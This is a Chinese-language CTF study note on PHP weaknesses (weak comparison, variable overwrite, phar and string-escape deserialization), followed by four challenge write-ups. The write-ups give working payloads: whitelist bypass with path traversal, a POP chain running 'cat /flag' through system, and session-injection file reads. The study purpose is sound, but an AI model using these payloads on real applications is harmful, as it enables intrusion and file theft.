# <font style="color:#000000;">一、讲义内作业</font>
+ **<font style="color:#000000;">PCRE回溯次数限制：</font>**

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737463576895-1c81abcb-0bbf-4284-8b59-fc75dd4a6eb8.png)

<font style="color:#000000;">图中第5步有红颜色，表示匹配不成功。此时b{1,3}已经匹配到了2个字符“b”，准备尝试第三个时，结果发现接下来的字符是“c”。那么就认为b{1,3}就已经匹配完毕。然后状态又回到之前的状态（即第6步，与第4步一样），最后再用子表达式c，去匹配字符“c”。当然，此时整个表达式匹配成功了preg_match的匹配存在回溯，回溯次数上限是1000000次，超过上限</font><font style="color:#000000;">后函数</font><font style="color:#000000;">直接返回false。</font>

+ **<font style="color:#000000;">fastcoll 工具</font>**

<font style="color:#000000;">内容不同但是md5值是相同的</font><font style="color:#000000;">，伟大！无需多言！</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737467807110-f79b6646-16d9-427c-b576-865339160fa0.png)

<font style="color:#000000;">其中被解析的字符第三行开头就有不一样的</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737468161698-806eaab2-802e-4d16-a596-c9bcb2137ccd.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737468183901-67b36a9e-e47b-4f30-ac58-40cb80e67491.png)

+ **<font style="color:#000000;">is_numeric()函数---获取变检测变量是否为数字或数字字符串</font>**
    - <font style="color:#000000;">如果var是数字或数字字符串则返回</font><font style="color:#000000;"> TRUE</font><font style="color:#000000;">，否则返回 </font><font style="color:#000000;">FALSE</font>
+ **<font style="color:#000000;">strcmp()函数---比较字符串大小函数</font>**
    - <font style="color:#000000;">strcmp只会处理字符串，如果给个数组的话呢，就会返回NULL</font>
+ **<font style="color:#000000;">sha1()函数---sha1 加密函数</font>**
    - <font style="color:#000000;">以下值在sha1 加密后以0E开头：</font>

```plain
aaroZmOk
aaK1STfY
aaO8zKZF
aa3OFF9m
0e1290633704
10932435112
```

+ **<font style="color:#000000;">extract()函数</font>**
    - <font style="color:#000000;">从数组中将变量到导入到当前符号表,该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表创建对应的一个变量</font>
+ **<font style="color:#000000;">in_array()函数</font>**
    - <font style="color:#000000;">用途：用来判断一个值是否在某一个数组列表里面</font>
    - <font style="color:#000000;">缺陷：当第三个参数不设置为true时(即严格模式)，存在自动类型转换(弱比较) ，当输入数字1后再紧跟其他字符串能够Bypass检测数组的功能</font>
+ **<font style="color:#000000;">parse_str()变量覆盖</font>**
    - <font style="color:#000000;">parse_str — 将字符串解析成多个变量：void parse_str ( string </font>`<font style="color:#000000;">$encoded_string</font>`<font style="color:#000000;"> [, array </font>`<font style="color:#000000;">&$result</font>`<font style="color:#000000;"> ] )</font>
    - <font style="color:#000000;">如果设置了第二个变量 result，变量将会以数组元素的形式存入到这个数组，作为替代</font>
    - <font style="color:#000000;">解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量，当parse_str()函数的参数值可以被用户控制时，则存在变量覆盖漏洞。</font>
+ **<font style="color:#000000;">字符串逃逸</font>**
    - <font style="color:#000000;">字符串逃逸：</font><font style="color:#000000;">在反序列化范围之外的字符（如花括号外的字符）都会被忽略，不影响反序列化的正常进行，一般分两种：</font><font style="color:#000000;">字符数增多和字符数减少</font>
    - <font style="color:#000000;">反序列化之所以存在字符串逃逸，最主要的原因是代码中存在针对序列化（serialize()）后的字符串进行了过滤操作（变多或者变少）</font>
    - <font style="color:#000000;">当字符增多：在输入的时候再加上精心构造的字符。经过过滤函数，字符变多之后，就把我们构造的给挤出来。从而实现字符逃逸</font>
    - <font style="color:#000000;">当字符减少：在输入的时候再加上精心构造的字符。经过过滤函数，字符减少后，会把原有的吞掉，使构造的字符实现代替</font>
+ **<font style="color:#000000;">phar反序列化</font>**
    - <font style="color:#000000;">phar反序列化</font><font style="color:#000000;">phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容</font>
    - <font style="color:#000000;">phar文件：</font>
    - <font style="color:#000000;">在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器</font>
    - <font style="color:#000000;">常见的流包装器：</font>

```plain
file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```

<font style="color:#000000;">漏洞利用条件：phar可以上传到服务器端(存在文件上传)</font>

<font style="color:#000000;">要有可用的魔术方法作为“跳板”。</font>

<font style="color:#000000;">文件操作函数的参数可控，且  :  、 /  、phar 等特殊字符没有被过滤 </font>

<font style="color:#000000;">phar生成</font>

```php
<?php
    class TestObject {
    }
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $o -> data='hu3sky';
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

<font style="color:#000000;">绕过方法：当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://等绕过</font>

```plain
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt
```

<font style="color:rgb(77, 77, 77);">也可以利用其它协议:</font>

```plain
php://filter/read=convert.base64-encode/resource=phar://phar.phar
```

# <font style="color:#000000;">二、刷题</font>
## <font style="color:#000000;">（一）[HCTF 2018]Warmup</font>
<font style="color:#000000;">还是这道题，之前写过了，这次复习一下</font>![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737477382261-04be3b7b-0cb4-4a29-923b-11a2e593af83.png)

<font style="color:#000000;">进去还是滑稽图</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737477321318-491d83d6-c708-41a8-9e37-75e3c64ba4a7.png)

<font style="color:#000000;">看源代码</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737477460871-4511fae6-48cb-4adb-9ee5-91b1f17d6f03.png)

<font style="color:#000000;">找 source.php 文件，打开后又有一串 PHP 代码</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737477321246-b6e51b6e-d7ca-4ebb-99d8-3bd53e4333cc.png)

<font style="color:#000000;">先看一下这个 emmm 类的代码</font>

```php
class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

```

+ <font style="color:#000000;">公有静态函数 checkFile</font>
+ <font style="color:#000000;">变量 whitelist 包含 source.php 和 hint.php 文件</font>
+ <font style="color:#000000;">第一个 if</font>
    - <font style="color:#000000;">条件： page 里为随机值或者 page 里的值的长度为 0</font>
    - <font style="color:#000000;">输出    you can't see it</font>
    - <font style="color:#000000;">返回值为 false</font>
+ <font style="color:#000000;">第二个 if</font>
    - <font style="color:#000000;">条件：</font><font style="color:#000000;">page 是否在whitelist 内</font>
    - <font style="color:#000000;">返回值为真</font>
+ <font style="color:#000000;">对 page 用mb_substr 函数</font>
    - <font style="color:#000000;">mb_substr 函数的参数里有一个mb_strpos 函数</font>
    - <font style="color:#000000;">mb_strpos 函数中先是把?连接在 page 变量的后面之后返回?的位置，即 page 的字符串长度加 1</font>
    - <font style="color:#000000;">之后执行mb_substr 函数，从 0 开始，即返回 page 里的字符串</font>
    - <font style="color:#000000;"> 该代码的作用是从 page 中提取? 前的部分内容。如果 page 中没有 ?，它会返回整个字符串。 通过这种方式，可以有效移除 page 中的查询参数部分  </font>
+ <font style="color:#000000;">第三个 if</font>
    - <font style="color:#000000;">条件：page 是否在whitelist 内</font>
    - <font style="color:#000000;">返回值为真</font>
+ <font style="color:#000000;">对 page 进行 url 加密</font>
+ <font style="color:#000000;">对 page 用mb_substr 函数（含义同上）</font>
+ <font style="color:#000000;">第四个 if</font>
    - <font style="color:#000000;">条件：</font><font style="color:#000000;">page 是否在whitelist 内</font>
    - <font style="color:#000000;">返回值为真</font>
+ <font style="color:#000000;">输出you can't see it</font>
+ <font style="color:#000000;">返回值为 false</font>

<font style="color:#000000;">之后看一下外面的 if 代码</font>

```php
if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
```

+ <font style="color:#000000;">条件：file 的 REQUEST 传参不为空 且 file 字符串长度不为 0 且 checkFile 函数返回值为 true</font>
+ <font style="color:#000000;">如果条件为真则把 file 请求的文件包含进来</font>
+ <font style="color:#000000;">如果条件为假则输出滑稽图</font>

<font style="color:#000000;">所以先让 file 的值为 hint.php 把该文件包含进来，不包含 source.php 文件的原因为该文件就是 source.php</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737479563341-1998a6bf-dd0e-437d-9469-246d277d5f12.png)

<font style="color:#000000;">所以之后可以用用 ? 跳过文件检测（该函数只截取到?之前的内容）</font>

<font style="color:#000000;">一层一层在文件找ffffllllaaaagggg 就行</font>

<font style="color:#000000;">构造 playload:</font>

```plain
?file=hint.php?/../../../../ffffllllaaaagggg
```

<font style="color:#000000;">拿到 flag</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737480162886-61e6f2f8-3a55-4f2c-90de-872ffd5f396f.png)

## <font style="color:#000000;">（二）</font><font style="color:#000000;">[FSCTF 2023]ez_php2</font>
<font style="color:#000000;">打开靶场发现以下 PHP 代码：</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737510177627-814a6d15-d95b-4dd3-9de6-2330be2977f9.png)

<font style="color:#000000;">先每个类进行分析</font>

<font style="color:#000000;">Class Rd:</font>

```php
Class Rd{
  public $ending;
  public $cl;
  public $poc;
  public function __destruct()
    {
      echo "All matters have concluded";
      die($this->ending);
    }
  public function __call($name, $arg)
    {
      foreach ($arg as $key =>$value)
        {
  
          if($arg[0]['POC']=="1111")
          {
            echo "1";
            $this->cl->var1 = "system";
          }
        }
    }
}
```

+ <font style="color:#000000;">先定义了三个变量：ending、c1、poc，且它们都是公有的</font>
+ <font style="color:#000000;">之后使用</font><font style="color:#000000;">__destruct</font><font style="color:#000000;">()魔术方法：</font><font style="color:#000000;">当对象被销毁时会触发这个方法</font>
    - <font style="color:#000000;">当对象被销毁后输出：All matters have concluded</font>
    - <font style="color:#000000;">结束代码</font>
+ <font style="color:#000000;">使用 _call()魔术方法：当调用一个不可访问的对象时会触发这个方法</font>
    - <font style="color:#000000;">这里它遍历参数，如果有某个键为 POC 且值为”1111“，则把 c1 的 var1 属性设置为”system“</font>

<font style="color:#000000;"></font>

<font style="color:#000000;">Class Poc</font>

```php
class Poc{
    public $payload;
    public $fun;
    public function __set($name, $value)
    {
        $this->payload = $name;
        $this->fun = $value;
    }

    function getflag($paylaod)
    {
        echo "Have you genuinely accomplished what you set out to do?";
        file_get_contents($paylaod);
    }
}
```

+ <font style="color:#000000;">先定义了两个变量：playload、fun，且它们都是公有的</font>
+ <font style="color:#000000;">之后使用 set 魔术方法（当给一个不可访问的属性赋值时会触发这个方法），把输入的属性值分别赋值给 playload 和 fun</font>
+ <font style="color:#000000;">定义 getflag 函数,形参为 playload 的值</font>
    - <font style="color:#000000;">输出：Have you genuinely accomplished what you set out to do?</font>
    - <font style="color:#000000;">用 file_get_contents($paylaod)尝试获取$playload 里的文件</font>

<font style="color:#000000;"></font>

<font style="color:#000000;">Class Er</font>

```php
class Er{
    public $symbol;
    public $Flag;
    public function __construct()
    {
        $this->symbol = True;
    }

    public function __set($name, $value)
    {
        $value($this->Flag);
    }


}
```

+ <font style="color:#000000;">先定义了两个变量：symbol、Flag，且它们都是公有的</font>
+ <font style="color:#000000;">使用构造函数，把 symbol 属性变为 True</font>
+ <font style="color:#000000;">使用 set 魔术方法它会将传入的值作为函数调用，并将Flag属性作为参数传入这个函数</font>

<font style="color:#000000;"></font>

<font style="color:#000000;">Class Ha</font>

```php
class Ha{
    public $start;
    public $start1;
    public $start2;
    public function __construct()
    {
        echo $this->start1."__construct"."</br>";
    }

    public function __destruct()
    {
        if($this->start2==="11111") {
            $this->start1->Love($this->start);
            echo "You are Good!";
        }
    }
}
```

+ <font style="color:#000000;">先定义了三个变量：start、start1、start2，且它们都是公有的</font>
+ <font style="color:#000000;">使用构造函数</font>
    - <font style="color:#000000;">输出 start1 属性的值并换行</font>
+ <font style="color:#000000;">使用__destruct()魔术方法（当调用对象被销毁时触发这个魔术方法）</font>
    - <font style="color:#000000;">如果 start2 属性的值为 11111，则调用 start1 的 Love 方法</font>
    - <font style="color:#000000;">并传入 start 属性作为参数</font>
    - <font style="color:#000000;">然后输出You are Good!</font>

```php
if(isset($_GET['Ha_rde_r']))
{
    unserialize($_GET['Ha_rde_r']);
} else{
    die("You are Silly goose!");
}
```

+ <font style="color:#000000;">检查Ha_rde_r是否为随机值，</font>
+ <font style="color:#000000;">如果为真则对Ha_rde_r 进行反序列化操作</font>
+ <font style="color:#000000;">否则输出You are Silly goose!</font>

<font style="color:#000000;"></font>

<font style="color:#000000;">分析代码后发现这道题入口是 Ha 类里面（毕竟 start 都写在里面了）</font>

<font style="color:#000000;">之后触发__destruct()魔术方法进入 Love 语句。</font>

<font style="color:#000000;">使得其触发__call 魔术方法，然后给start赋值（ [‘POC’=>‘1111’] ）</font>

<font style="color:#000000;">之后 c1 中的 var1触发__set 魔术方法，之后它的 value就成为了system</font>

<font style="color:#000000;">修改$Flag就可以修改执行的命令了</font>

<font style="color:#000000;">构造以下脚本：</font>

```php
<?php
Class Rd{
    public $ending;
    public $cl;
    public $poc;
}
class Poc{
    public $playload;
    public $fun;
}
class Er{
    public $symbol;
    public $Flag='cat /flag';
}
class Ha{
    public $start;
    public $start1;
    public $start2="11111";
}

$a=new Ha();
$a->start1=new Rd();
$a->start=['POC'=>'1111'];
$a->start1->cl=new Er();
echo serialize($a);
?>
```

<font style="color:#000000;">先按照题目的内容写几个类和对象（其中 Flag 要赋值为 'cat /flag'，之后要用到 system 函数输出）。从 Ha 入手，由于从 c1 在 Rd 内，所以先给 a 中 start1 用类 Rd 赋值，并把其中键 POC 对应的值赋值为 "1111“,之后用 Er 类给 c1 赋值，之后输出 a。这样就满足条件了。</font>

<font style="color:#000000;">输出结果为</font>

```plain
O:2:"Ha":3:{s:5:"start";a:1:{s:3:"POC";s:4:"1111";}s:6:"start1";O:2:"Rd":3:{s:6:"ending";N;s:2:"cl";O:2:"Er":2:{s:6:"symbol";N;s:4:"Flag";s:9:"cat /flag";}s:3:"poc";N;}s:6:"start2";s:5:"11111";}
```

<font style="color:#000000;">传入参数</font>

```plain
?Ha_rde_r=O:2:"Ha":3:{s:5:"start";a:1:{s:3:"POC";s:4:"1111";}s:6:"start1";O:2:"Rd":3:{s:6:"ending";N;s:2:"cl";O:2:"Er":2:{s:6:"symbol";N;s:4:"Flag";s:9:"cat /flag";}s:3:"poc";N;}s:6:"start2";s:5:"11111";}
```

<font style="color:#000000;">拿到 flag</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737513460231-deb60d72-66b2-4c9c-b4ca-4d748f21d207.png)

## <font style="color:#000000;">（三）</font><font style="color:#000000;">[安洵杯 2019]easy_serialize_php</font>
<font style="color:#000000;">进入靶场发现这个连接</font>

## ![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737528784678-2dd6ad78-1996-46b4-9ef1-b02d878e3521.png)
<font style="color:#000000;">点进入发现是一串 PHP 代码</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737528891440-f39ba9da-f8d9-4c83-9687-ac38e5d02f25.png)

<font style="color:#000000;">注意到：</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737529440871-a0f46fae-8c14-4861-b69a-4cffd7f35684.png)

<font style="color:#000000;">进去之后注意到可疑文件</font>![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737529464933-0c1808aa-ce5f-46ae-8f21-a29d42a23647.png)

<font style="color:#000000;">下面还有这一段代码，存在反序列化，应该就是入口了</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737529555759-cb2d90b5-7859-4998-b696-6d5adf24ff32.png)

<font style="color:#000000;">先尝试把 f 赋值为 show_image,之后出现以下界面</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737529522386-4dc771fa-6d1d-4a84-8507-587948e47919.png)

<font style="color:#000000;">没有头绪，先分析代码吧</font>

```php
$function = @$_GET['f'];
```

<font style="color:#000000;">GET 传参</font>

<font style="color:#000000;"></font>

```php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
```

<font style="color:#000000;">把php、flag、php5、php4和flig 替换为为空字符串</font>

<font style="color:#000000;"></font>

```php
if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);
```

<font style="color:#000000;">对$_SESSION 重新赋值，user 对应 guest，function 对应$function</font>

<font style="color:#000000;"></font>

```php
if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}
```

<font style="color:#000000;">如果 function 为 0，则输出该页面</font>

<font style="color:#000000;"></font>

```php
if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}
```

<font style="color:#000000;">GET 传参 img_path，如果 img_path 为 0，则对guest_img.png 进行 base64 加密，否则就对 img_path 先进行 base64 加密，再进行 sha1 加密</font>

<font style="color:#000000;"></font>

```php
$serialize_info = filter(serialize($_SESSION));
```

<font style="color:#000000;">对$_SESSION 序列化的值进行过滤并赋值给serialize_info </font>

<font style="color:#000000;"></font>

```php
if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

<font style="color:#000000;">最后就是对 function 的判断</font>

+ <font style="color:#000000;">如果 function 的值为highlight_file，则输出该页面</font>
+ <font style="color:#000000;">如果 function 的值为 phpinfo，则输出该 PHP 代码的信息</font>
+ <font style="color:#000000;">如果 function的值为 show_image 则把serialize_info 进行反序列化并赋值给 userinfo，并输出 base64 解密后的 userinfo 的 img。</font>

<font style="color:#000000;"></font>

<font style="color:#000000;">所以本体的思路为：</font>

<font style="color:#000000;">该 PHP 代码会将userinfo中的['img']值做base64解码，然后吧提到的整个文件读入一个字符串中，所以我们就要构造img的值，让代码读出内容，经过上文的分析，想要修改img的值可以通过设置img_path，或者修改userinfo['img']的内容</font>

<font style="color:#000000;">首先看修改img_path</font>

<font style="color:#000000;">这个方法有一个小问题，修改img_path，传入的内容会被base64和sha1加密，然而，高亮文件内容时只做了base64的解密，没有 sha1 解密，所以修改img_path是无法读到文件的，所以只能修改userinfo['img'] 的内容</font>

<font style="color:#000000;">userinfo['img']的内容由_SESSION组成，所以我们可以修改user和function，考虑到有过滤，可以采用反序列化字符逃逸来构造SESSION['img']的值，其中ZDBnM19mMWFnLnBocA==是 d0g3_f1ag.php 的 base64 编码后的结果</font>

<font style="color:#000000;">关于本题的键值逃逸</font>

+ <font style="color:#000000;">因为序列化的字符串是严格的，对应的格式不能错，比如s:4:“name”,那s:4就必须有一个字符串长度是4的否则就往后要。</font>
+ <font style="color:#000000;">并且反序列化会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号外的就都被扔掉。</font>

<font style="color:#000000;">先构造img属性</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737533856994-7dab4b74-deae-47b9-9baa-38dfb2e449d2.png)

<font style="color:#000000;">即</font>

```plain
s:3:"img";s:20:"ZDBnM19mMWFnLnBocA=="; 
```

<font style="color:#000000;">之后我们要确定_SESSION[ ] 里面的东西：</font>

<font style="color:#000000;">原字符串：</font>

```plain
a:2:{s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

<font style="color:#000000;">经过filter过滤后phpflag就会被替换成空字符串</font>

<font style="color:#000000;">所以 s:7:“phpflag"就变成了 s:7:”"</font>

+ <font style="color:#000000;">但是这里会出现问题，因为这里要求的字符串的长度为7，但是这里却是空字符串。所以它会向后索取字符串。直到长度正好为7。细心的话，可以看到 ";s:48: 这个字符串的长度正好为7</font>

<font style="color:#000000;">当phpflag被替换成空字符串时，原本的键值对就变成：</font>

+ <font style="color:#000000;">第一个变量的名： s:7:"";s:48:";</font>
+ <font style="color:#000000;">第一个变量的值： s:1:“1”;</font>
+ <font style="color:#000000;">第二个变量的名： s:3:“img”;</font>
+ <font style="color:#000000;">第二个变量的值： s:20:“ZDBnM19mMWFnLnBocA==”;</font>

<font style="color:#000000;">再加上PHP序列化的严格规定，会把后面多余的字符串丢弃。就变成了：</font>

```plain
a:1:{s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

<font style="color:#000000;">所以构造 playload:</font>

```plain
_SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737535582456-f7751974-76ce-4244-8b8b-acfd1f05c952.png)

<font style="color:#000000;">但是页面源代码出现了这个，所以在进行对/d0g3_fllllllag base64 加密</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737535582402-5bc666a5-f79a-40e5-8d81-0d2a4fe79f4d.png)

<font style="color:#000000;">所以最终 playload 为</font>

```plain
http://node7.anna.nssctf.cn:21451/index.php?f=show_image
_SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
```

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737535703721-547eefe4-059f-470b-9a88-40651d8cf4a3.png)

## <font style="color:#000000;">（四）</font><font style="color:#000000;">[第五空间 2021]pklovecloud</font>
![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737540928424-8c312bde-7fef-464f-add1-0975c2871ed3.png)

<font style="color:#000000;">分析代码</font>

```php
include 'flag.php';
class pkshow 
{  
    function echo_name()     
    {          
        return "Pk very safe^.^";      
    }  
} 
```

+ <font style="color:#000000;">把 flag.php 文件包含进来</font>
+ <font style="color:#000000;">定义了一个类 pkshow</font>
    - <font style="color:#000000;">在类中定义了一个函数 echo_name()</font>
    - <font style="color:#000000;">返回值为  Pk very safe^.^</font>

```php
class acp 
{   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct() 
    {      
        $this->cinder = new pkshow;
    }  
    function __toString()      
    {          
        if (isset($this->cinder))  
            return $this->cinder->echo_name();      
    }  
} 
```

+ <font style="color:#000000;">定义了一个类 acp</font>
+ <font style="color:#000000;">类中有 public 成员 neutron 和 nova 以及 protected 成员 cinder</font>
+ <font style="color:#000000;">使用魔术方法__construct() ，在对象被创建时调用</font>
    - <font style="color:#000000;">新建立一个对象并赋值给 cinder</font>
+ <font style="color:#000000;">使用魔术方法__toString()， 类被当成字符串时的回应方法</font>
    - <font style="color:#000000;">先判断 cinder 是否为随机值，如果是则返回 echo_name 函数的值</font>

```php
class ace
{    
    public $filename;     
    public $openstack;
    public $docker; 
    function echo_name()      
    {   
        $this->openstack = unserialize($this->docker);
        $this->openstack->neutron = $heat;
        if($this->openstack->neutron === $this->openstack->nova)
        {
        $file = "./{$this->filename}";
            if (file_get_contents($file))         
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return "keystone lost~"; 
            }    
        }
    }  
}
```

+ <font style="color:#000000;">定义了一个类 ace</font>
+ <font style="color:#000000;">公有成员为filename、openstack、docker</font>
+ <font style="color:#000000;">定义函数 echo_name()</font>
    - <font style="color:#000000;">对docker 进行反序列化并把值赋值给openstack</font>
    - <font style="color:#000000;">把 heat 赋值给 openstack 中的 neutron</font>
+ <font style="color:#000000;">判断 openstack 中的 neutron 的值是否与 openstack 中 nova 的值相等</font>
    - <font style="color:#000000;">如果相等则把 filename 的值赋值给 file</font>
    - <font style="color:#000000;">判断 file 里是否有内容</font>
        * <font style="color:#000000;">如果有则返回 file 文件的内容</font>
        * <font style="color:#000000;">否则返回keystone lost~</font>

```php
if (isset($_GET['pks']))  
{
    $logData = unserialize($_GET['pks']);
    echo $logData; 
} 
else 
{ 
    highlight_file(__file__); 
}
```

+ <font style="color:#000000;">这判断 pks 是否是随机值</font>
+ <font style="color:#000000;">如果是随机值则把 pks 反序列化的值赋值给 logData 并输出其值</font>
+ <font style="color:#000000;">否则显示代码</font>

<font style="color:#000000;">pks 要是我们序列化的代码，</font>

<font style="color:#000000;">所以构造序列化代码：</font>

```php
<?php  
  class acp 
{   
  protected $cinder ; 
  public $neutron;
  public $nova;
  function __construct() 
  {      
    $this->cinder = new ace;
  }
}  
class ace
{    
  public $filename = 'flag.php';     
  public $openstack;
  public $docker;        
}  

$a= new ace();
$a->docker = null;
$b=new acp();
echo urlencode(serialize($b));
```

<font style="color:#000000;">其中要把 flag.php 的内容赋值给 filename 方便以后打开文件，并且 docker 要为空从而使得neutron 与 nova 相等。</font>

<font style="color:#000000;">输出结果：</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737542997735-3053bd85-5855-4a4d-a581-06cf53e79893.png)

<font style="color:#000000;">即</font>

```php
O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3BN%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D
```

<font style="color:#000000;">所以传上去看看</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737542979421-636612da-89af-4605-b27b-00537eda5aa7.png)

<font style="color:#000000;">查看源代码得到这个，提示我们 flag 在 /nssctfasdasdflag 这里</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737542979379-499e771e-ffa1-4afd-a046-3df242219a14.png)

<font style="color:#000000;">所以把 flag.php 改为nssctfasdasdflag 在输出一遍即可</font>

<font style="color:#000000;">playload:</font>

```php
?pks=O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A34%3A%22..%2F..%2F..%2F..%2F..%2F..%2Fnssctfasdasdflag%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3Bs%3A17%3A%22O%3A6%3A%22pkshow%22%3A0%3A%7B%7D%22%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D
```

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737544347967-bfea4fb9-5bc1-427e-b675-02f08a0abf78.png)

